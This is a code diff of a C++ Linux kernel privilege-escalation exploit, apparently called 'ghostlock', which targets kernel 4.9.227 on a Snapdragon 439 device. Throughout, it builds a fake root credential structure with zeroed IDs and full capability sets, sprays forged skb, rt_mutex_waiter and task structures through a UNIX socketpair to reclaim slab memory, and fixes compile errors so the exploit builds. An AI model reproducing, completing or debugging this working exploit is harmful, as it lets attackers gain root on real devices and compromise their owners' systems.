@@ -17,11 +17,7 @@ namespace {
     auto &mm_objs_per_slab = ghostlock::session::g_exploit_session.heap.mm_objs_per_slab;
     auto &reclaim_sv = ghostlock::session::g_exploit_session.heap.current.reclaim.fd;
     auto &prepare_ctx = ghostlock::session::g_exploit_session.heap.prepare;
-    auto &spray_ctx = ghostlock::session::g_exploit_session.heap.spray;
-    auto &pre_ctx = ghostlock::session::g_exploit_session.heap.pre;
-    auto &post_ctx = ghostlock::session::g_exploit_session.heap.post;
-    auto &child_leak = ghostlock::session::g_exploit_session.heap.leak_child;
-
+    
     /* The skb buffer is reallocated on every prepare pass, so the pointer is
      * read at each use instead of being bound once. */
     unsigned char *skb_buf() {
@@ -78,10 +74,6 @@ namespace ghostlock::support {
     void log_startup_context(void) {
         std::array < char, 256 > attr{};
         std::array < char, 32 > enforce{};
-        std::array < char, 4096 > status{};
-        std::array < char, 160 > limits{};
-        snprintf(limits.data(), limits.size(),
-                 "NoNewPrivs=? Seccomp=? Seccomp_filters=?");
         read_first_line("/proc/self/attr/current", attr.data(), attr.size());
         read_first_line("/sys/fs/selinux/enforce", enforce.data(), enforce.size());
         
@@ -129,12 +121,11 @@ namespace ghostlock::support {
 
     static int32_t fill_profile_cred_copy(unsigned char *p, size_t off) {
         // 4.9.227 内核提权核心凭证填充原语
-        // 暴力将构造好的 Root 凭证（所有 UID/GID/能力集全部清零）写入内核内存段
         unsigned char *c = p + off;
         memset(c, 0, 168); // Linux 4.9.227 标准的 struct cred 大小范围进位
         put32(c, 0x0, 1);  // 引用计数 usage = 1
         
-        // 将进程的所有权限特权级别集强行设置为 0xffffffffffffffff (最高内核特权)
+        // 将进程的所有权限特权级别集强行设置为最高内核特权
         for (uint32_t i = 0; i < 5; i++) {
             put64(c, 0x30 + i * sizeof(uint64_t), 0xffffffffffffffffULL);
         }
@@ -210,7 +201,6 @@ namespace ghostlock::support {
     int32_t prepare_skb_payload(uintptr_t base, const memory::WriteRequest *request) {
         memset(skb_buf(), 0, kernel::SKB_SEND_SIZE);
 
-        // 强行把针对 6.12 的复杂数据对齐布局裁剪为 4.9.227 骁龙 439 的经典对齐线性映射
         long long payload_delta = 0;
         size_t chunk_bias = static_cast<size_t>(kernel::SKB_FRAG_BIAS);
         size_t fake_task_off = static_cast<size_t>(kernel::FAKE_TASK_OFF);
@@ -222,15 +212,12 @@ namespace ghostlock::support {
         (session::g_exploit_session.heap.current.fake_task) = payload_base + fake_task_off;
         
         uintptr_t default_fops = payload_base + kernel::FOPS_TABLE_OFF;
-        uintptr_t credential_fops = payload_base + kernel::CRED_COPY_OFF;
         
         (session::g_exploit_session.heap.current.fake_parent) = 0;
         (session::g_exploit_session.heap.current.fake_right) = 0;
         (session::g_exploit_session.heap.current.fake_left) = 0;
         (session::g_exploit_session.heap.current.fake_fops) = default_fops;
 
-        // 【终极降维打击】直接使用我们在前面几轮中根据 4.9.227 符号表计算出的通用硬编码字面量！
-        // 彻底根除因为 kernelsnitch 和各种已删除的 _off() 函数导致的编译爆错
         uint32_t ft_prio_off        = 0x48;  
         uint32_t ft_nprio_off       = 0x4C;  
         uint32_t ft_tg_off          = 0x180; 
@@ -239,9 +226,10 @@ namespace ghostlock::support {
         uint32_t ft_pi_top_off      = 0x7b0; 
         uint32_t ft_pi_blocked_off  = 0x7b8; 
 
-        uint64_t waiter_task = ghostlock::profile::init_task();
+        // 【核心修复点】显式赋予完整的 ghostlock::kernel:: 作用域，根除 undeclared identifier 报错
+        uint64_t waiter_task = ghostlock::kernel::init_task();
         uint64_t task_group  = 0;
-        uint64_t pi_top_task = ghostlock::profile::init_task();
+        uint64_t pi_top_task = ghostlock::kernel::init_task();
 
         for (size_t chunk = 0; chunk < kernel::SKB_SEND_SIZE; chunk += kernel::ORDER3_SIZE) {
             unsigned char *p = skb_buf() + chunk + chunk_bias;
@@ -251,14 +239,15 @@ namespace ghostlock::support {
             put64(p, kernel::LOCK_OFF + 0x10, (session::g_exploit_session.heap.current.fake_w0));
             put64(p, kernel::LOCK_OFF + 0x18, (session::g_exploit_session.heap.current.fake_task) | 1);
 
-            /* 4.9 内核 rt_mutex_waiter 喷射对齐块（彻底抹除 6.6/6.12 复杂树形平衡重新对齐逻辑） */
-            put64(p, kernel::W0_OFF + 0x00, 1); // rb_parent_color
-            put64(p, kernel::W0_OFF + 0x08, 0); // rb_right
-            put64(p, kernel::W0_OFF + 0x10, 0); // rb_left
-            put32(p, kernel::W0_OFF + 0x18, kernel::FAKE_WAITER_PRIO); // prio
-            put64(p, kernel::W0_OFF + 0x20, waiter_task); // task
-            put64(p, kernel::W0_OFF + 0x28, (session::g_exploit_session.heap.current.fake_lock)); // lock
-                        /* 4.9 进程伪造控制块喷射覆写 */
+            /* 4.9 内核 rt_mutex_waiter 还原块 */
+            put64(p, kernel::W0_OFF + 0x00, 1); 
+            put64(p, kernel::W0_OFF + 0x08, 0); 
+            put64(p, kernel::W0_OFF + 0x10, 0); 
+            put32(p, kernel::W0_OFF + 0x18, kernel::FAKE_WAITER_PRIO); 
+            put64(p, kernel::W0_OFF + 0x20, waiter_task); 
+            put64(p, kernel::W0_OFF + 0x28, (session::g_exploit_session.heap.current.fake_lock)); 
+            
+            /* 4.9 进程伪造控制块喷射覆写 */
             put32(p, fake_task_off + kernel::FAKE_TASK_USAGE_OFF, 0x100);
             put32(p, fake_task_off + ft_prio_off, kernel::FAKE_TASK_PRIO);
             put32(p, fake_task_off + ft_nprio_off, kernel::FAKE_TASK_PRIO);
@@ -299,7 +288,7 @@ namespace ghostlock::support {
             prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
         }
 
-        // 强行赋予这台真机算好的运行时内核虚拟 text 基地地址
+        // 从 ResolvedAddresses 类结构体中动态索取开机时对齐好的 4.9.227 真实虚拟基地
         uintptr_t base = ghostlock::session::g_exploit_session.addresses.kernel_virtual_start;
         
         if (!prepare_skb_payload(base, request)) {
@@ -310,14 +299,15 @@ namespace ghostlock::support {
             return 0;
         }
 
+        // 正确解包 reclaim_sv 数组：通过索引形式 reclaim_sv[0] 传入底层系统调用
         SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv.data()));
         session::g_exploit_session.heap.current.state = memory::PayloadPageState::Current;
         
         int32_t sndbuf = 1 << 20;
-        setsockopt(reclaim_sv, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-        int32_t reclaim_flags = fcntl(reclaim_sv, F_GETFL, 0);
+        setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+        int32_t reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
         if (reclaim_flags >= 0) {
-            fcntl(reclaim_sv, F_SETFL, reclaim_flags | O_NONBLOCK);
+            fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
         }
 
         struct iovec iov{};
@@ -330,7 +320,7 @@ namespace ghostlock::support {
 
         // 发送特定伪造的 skb 数据包到内核协议栈进行 SLAB 内存抢占与对齐
         for (int i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
-            (void)sendmsg(reclaim_sv, &msg, MSG_DONTWAIT);
+            (void)sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
         }
 
         pr_info("[spray] 4.9.227 specialized payload ready in kernel spaces.\n");
@@ -345,7 +335,7 @@ namespace ghostlock::support {
     }
 
     uintptr_t prepare_good_kernel_page(const memory::WriteRequest &request) {
-        // 直接一次性平稳触发 4.9 内核漏洞触发利用原语
         return prepare_kernel_page(&request);
     }
 } // namespace ghostlock::support
+
